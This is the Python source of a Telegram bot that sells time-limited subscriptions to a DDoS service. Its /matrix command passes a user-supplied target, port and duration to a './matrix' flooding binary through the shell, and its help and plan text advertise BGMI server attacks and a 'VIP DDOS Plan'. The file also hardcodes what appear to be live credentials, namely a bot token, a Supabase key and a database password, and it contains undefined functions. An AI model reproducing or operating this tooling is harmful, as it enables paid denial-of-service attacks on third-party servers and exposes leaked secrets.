#!/usr/bin/python3
# MADE BY @its_MATRIX_king
#!/usr/bin/python3
import telebot
import multiprocessing
import os
import random
from datetime import datetime, timedelta
import subprocess
import sys
import time
import logging
import socket
import pytz
from supabase import create_client, Client
import psycopg2
import threading
import re

admin_id = ["7418099890"]
admin_owner = ["7418099890"]
os.system('chmod +x *')

# Supabase configuration
url = "https://nvbfnemhjhhsowkefktf.supabase.co"
key = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im52YmZuZW1oamhoc293a2Vma3RmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzI4MDE4NjIsImV4cCI6MjA0ODM3Nzg2Mn0.9iMgwDEEBoyDqrMI-5qpDzc18lrQEDJDQzhqcnPlPgo"
supabase: Client = create_client(url, key)

bot = telebot.TeleBot('7599785141:AAHao7Ch4riVntMSxbUSHqA9z1sQiHEWYTg')
IST = pytz.timezone('Asia/Kolkata')

# Database connection
connection = psycopg2.connect(
    host="aws-0-ap-south-1.pooler.supabase.com",
    database="postgres",
    user="postgres.nvbfnemhjhhsowkefktf",
    password="Uthaya$4123",
    port=6543
)
cursor = connection.cursor()

# Tables
USER_TABLE = "users"
KEYS_TABLE = "unused_keys"

# Store ongoing attacks globally
ongoing_attacks = []

def clean_expired_users():
    try:
        cursor.execute("""
            DELETE FROM users
            WHERE expiration < NOW()
            RETURNING user_id, username
        """)
        removed_users = cursor.fetchall()
        connection.commit()
        for user in removed_users:
            bot.send_message(
                user[0],
                "Your subscription has expired. Contact @its_MATRIX_King to renew."
            )
    except Exception as e:
        logging.error(f"Error cleaning expired users: {e}")
        connection.rollback()

def start_scheduler():
    scheduler = BackgroundScheduler()
    scheduler.add_job(clean_expired_users, 'interval', seconds=30)
    scheduler.start()

def create_tables():
    try:
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id BIGINT PRIMARY KEY,
                username TEXT,
                key TEXT,
                expiration TIMESTAMP WITH TIME ZONE
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS unused_keys (
                key TEXT PRIMARY KEY,
                duration INTEGER,
                created_at TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP,
                is_used BOOLEAN DEFAULT FALSE
            )
        """)
        connection.commit()
    except Exception as e:
        logging.error(f"Error creating tables: {e}")
        connection.rollback()

def parse_time_input(time_input):
    match = re.match(r"(\d+)([mhd])", time_input)
    if match:
        number = int(match.group(1))
        unit = match.group(2)
        if unit == "m":
            return timedelta(minutes=number)
        elif unit == "h":
            return timedelta(hours=number)
        elif unit == "d":
            return timedelta(days=number)
    return None

@bot.message_handler(commands=['key'])
def generate_key(message):
    user_id = str(message.chat.id)
    if user_id not in admin_owner:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "📝 Usage: /key <duration>\nExample: 1d, 7d, 30d")
            return
        duration_str = args[1]
        duration = parse_time_input(duration_str)
        if not duration:
            bot.reply_to(message, "❌ Invalid duration format. Use: 1d, 7d, 30d")
            return
        letters = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=4))
        numbers = ''.join(str(random.randint(0, 9)) for _ in range(4))
        key = f"MTX{letters}{numbers}"
        cursor.execute("""
            INSERT INTO unused_keys (key, duration, created_at, is_used)
            VALUES (%s, %s, NOW(), FALSE)
        """, (key, duration.total_seconds()))
        connection.commit()
        bot.reply_to(message, f"""✅ Key Generated Successfully
🔑 Key: `{key}`
⏱ Duration: {duration_str}
📅 Generated: {datetime.now(IST).strftime('%Y-%m-%d %H:%M:%S')}""")
    except Exception as e:
        bot.reply_to(message, f"❌ Error generating key: {str(e)}")
        connection.rollback()

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "📝 Usage: /redeem <key>")
            return
        key = args[1].strip()
        user_id = str(message.chat.id)
        username = message.from_user.username or "Unknown"
        
        cursor.execute("SELECT expiration FROM users WHERE user_id = %s AND expiration > NOW()", (user_id,))
        existing_sub = cursor.fetchone()
        if existing_sub:
            bot.reply_to(message, "❌ You already have an active subscription!")
            return
        
        cursor.execute("""
            SELECT duration FROM unused_keys
            WHERE key = %s AND is_used = FALSE
        """, (key,))
        result = cursor.fetchone()
        if not result:
            bot.reply_to(message, "❌ Invalid or already used key!")
            return
        duration = result[0]
        expiration = datetime.now(IST) + timedelta(seconds=duration)
        
        cursor.execute("""
            INSERT INTO users (user_id, username, key, expiration)
            VALUES (%s, %s, %s, %s)
        """, (user_id, username, key, expiration))
        cursor.execute("UPDATE unused_keys SET is_used = TRUE WHERE key = %s", (key,))
        connection.commit()
        bot.reply_to(message, f"✅ Key Redeemed Successfully!\n\n📅 Expires: {expiration.strftime('%Y-%m-%d %H:%M:%S')}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error redeeming key: {str(e)}")
        connection.rollback()

@bot.message_handler(commands=['remove'])
def remove_key(message):
    user_id = str(message.chat.id)
    if user_id not in admin_owner:
        bot.reply_to(message, "Only Admin Can Run This Command.")
        return
    try:
        args = message.text.split()
        if len(args) != 2:
            bot.reply_to(message, "Usage: /remove <key>")
            return
        key = args[1]
        cursor.execute("DELETE FROM unused_keys WHERE key = %s", (key,))
        cursor.execute("DELETE FROM users WHERE key = %s", (key,))
        connection.commit()
        bot.reply_to(message, f"Key {key} has been removed successfully.")
    except Exception as e:
        logging.error(f"Error removing key: {e}")
        bot.reply_to(message, "An error occurred while removing the key.")

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_owner:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return
    try:
        cursor.execute("""
            SELECT user_id, username, key, expiration
            FROM users
            WHERE expiration > NOW()
            ORDER BY expiration DESC
        """)
        users = cursor.fetchall()
        if not users:
            bot.reply_to(message, "📝 No active users found")
            return
        response = "👥 Active Users:\n\n"
        for user in users:
            remaining = user[3] - datetime.now(IST)
            days = remaining.days
            hours = remaining.seconds // 3600
            minutes = (remaining.seconds % 3600) // 60
            response += f"🆔 ID: {user[0]}\n"
            response += f"👤 User: @{user[1]}\n"
            response += f"🔑 Key: {user[2]}\n"
            response += f"⏳ Remaining: {days}d {hours}h {minutes}m\n"
            response += f"📅 Expires: {user[3].strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"❌ Error fetching users: {str(e)}")

@bot.message_handler(commands=['allkeys'])
def show_all_keys(message):
    user_id = str(message.chat.id)
    if user_id not in admin_owner:
        bot.reply_to(message, "⛔️ Access Denied: Admin only command")
        return
    try:
        cursor.execute("""
            SELECT key, duration, created_at
            FROM unused_keys
            WHERE is_used = FALSE
            ORDER BY created_at DESC
        """)
        keys = cursor.fetchall()
        if not keys:
            bot.reply_to(message, "📝 No unused keys available")
            return
        response = "🔑 Available Keys:\n\n"
        for key in keys:
            duration_days = key[1] / (24 * 3600)
            duration_hours = (key[1] % (24 * 3600)) / 3600
            response += f"Key: `{key[0]}`\n"
            response += f"Duration: {int(duration_days)} days {int(duration_hours)} hours\n"
            response += f"Created: {key[2].strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        bot.reply_to(message, response)
    except Exception as e:
        bot.reply_to(message, f"❌ Error fetching keys: {str(e)}")

from apscheduler.schedulers.background import BackgroundScheduler
from concurrent.futures import ThreadPoolExecutor

executor = ThreadPoolExecutor(max_workers=50)
attack_lock = threading.Lock()

def execute_attack(message, target, port, time, username):
    with attack_lock:
        ongoing_attacks.append({
            'user': username,
            'target': target,
            'port': port,
            'time': time,
            'start_time': datetime.now()
        })
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
    bot.reply_to(message, response)
    full_command = f"./matrix {target} {port} {time}"
    result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
    print(f"Attack output: {result.stdout}")
    with attack_lock:
        ongoing_attacks.remove({
            'user': username,
            'target': target,
            'port': port,
            'time': time,
            'start_time': datetime.now()
        })
    bot.reply_to(message, f"✅ Attack completed successfully\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬")

@bot.message_handler(commands=['matrix'])
def handle_matrix(message):
    try:
        user_id = str(message.chat.id)
        cursor.execute("SELECT expiration FROM users WHERE user_id = %s", (user_id,))
        user = cursor.fetchone()
        if not user or user[0] < datetime.now(IST):
            bot.reply_to(message, "❌ You don't have an active subscription or your subscription has expired.")
            return

        command = message.text.split()
        if len(command) != 4:
            bot.reply_to(message, "Usage: /matrix <target> <port> <time>")
            return
        target = command[1]
        port = int(command[2])
        time = int(command[3])
        if time > 180:
            bot.reply_to(message, "Time must be 180 seconds or less")
            return
        username = message.from_user.username or message.from_user.first_name
        executor.submit(execute_attack, message, target, port, time, username)
    except Exception as e:
        bot.reply_to(message, f"Error processing request: {str(e)}")

@bot.message_handler(commands=['status'])
def show_status(message):
    with attack_lock:
        current_time = datetime.now()
        active_attacks = [
            attack for attack in ongoing_attacks
            if (current_time - attack['start_time']).total_seconds() < attack['time']
        ]
        if active_attacks:
            response = "🔴 Active Attacks:\n\n"
            for attack in active_attacks:
                elapsed = current_time - attack['start_time']
                remaining = attack['time'] - int(elapsed.total_seconds())
                if remaining > 0:
                    response += f"User: {attack['user']}\n"
                    response += f"Target: {attack['target']}\n"
                    response += f"Time Left: {remaining}s\n\n"
        else:
            response = "No active attacks"
        bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    try:
        user_id = str(message.chat.id)

        # Basic help text for all users
        help_text = '''Available Commands:
    - /matrix : Execute a BGMI server attack (specific conditions apply).
    - /rulesanduse : View usage rules and important guidelines.
    - /plan : Check available plans and pricing for the bot.
    - /status : View ongoing attack details.
    - /id : Retrieve your user ID.
    '''

        # Check if the user is an admin and append admin commands
        if user_id in admin_id:
            help_text += '''
Admin Commands:
    - /add <user_id> <time_in_minutes> : Add a user with specified time.
    - /remove <user_id> : Remove a user from the authorized list.
    - /allusers : List all authorized users.
    - /broadcast : Send a broadcast message to all users.
    '''

        # Footer with channel and owner information
        help_text += ''' 
JOIN CHANNEL - @MATRIX_CHEATS
BUY / OWNER - @its_MATRIX_King
'''

        # Send the constructed help text to the user
        bot.reply_to(message, help_text)
    
    except Exception as e:
        logging.error(f"Error in /help command: {e}")
        bot.reply_to(message, "An error occurred while fetching help. Please try again.")
    
@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome to Our BOT, {user_name}\nRun This Command : /help\nJOIN CHANNEL - @MATRIX_CHEATS\nBUY / OWNER - @its_MATRIX_King "
    bot.reply_to(message, response)

@bot.message_handler(commands=['rulesanduse'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules:

1. Time Should Be 180 or Below
2. Click /status Before Entering Match
3. If There Are Any Ongoing Attacks You Cant use Wait For Finish
JOIN CHANNEL - @MATRIX_CHEATS
BUY / OWNER - @its_MATRIX_King '''
   
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, 
    Purchase VIP DDOS Plan From @its_Matrix_King
    Join Channel @MATRIX_CHEATS
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_id = str(message.chat.id)

    # Check if user is in owners.txt
    with open('owner.txt', "r") as file:
        owners = file.read().splitlines()

    if user_id in owners:
        user_name = message.from_user.first_name
        response = f'''{user_name}, Admin Commands Are Here!!:

        /add <userId> : Add a User.
        /remove <userId> : Remove a User.
        /allusers : Authorized Users List.
        /broadcast : Broadcast a Message.
        Channel - @MATRIX_CHEATS
        Owner/Buy - @its_Matrix_King
        '''
        bot.reply_to(message, response)
    else:
        response = "You do not have permission to access admin commands."
        bot.reply_to(message, response)


# Handler for broadcasting a message
@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_owner:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            users = read_users()  # Get users from Redis
            if users:
                for user in users:
                    try:
                        bot.send_message(user, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user}: {str(e)}")
                response = "Broadcast Message Sent Successfully To All Users."
            else:
                response = "No users found in the system."
        else:
            response = "Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command."

    bot.reply_to(message, response)

def run_bot():
    create_tables()
    start_scheduler()
    while True:
        try:
            print("Bot is running...")
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            logging.error(f"Bot error: {e}")
            time.sleep(15)

if __name__ == "__main__":
    run_bot()

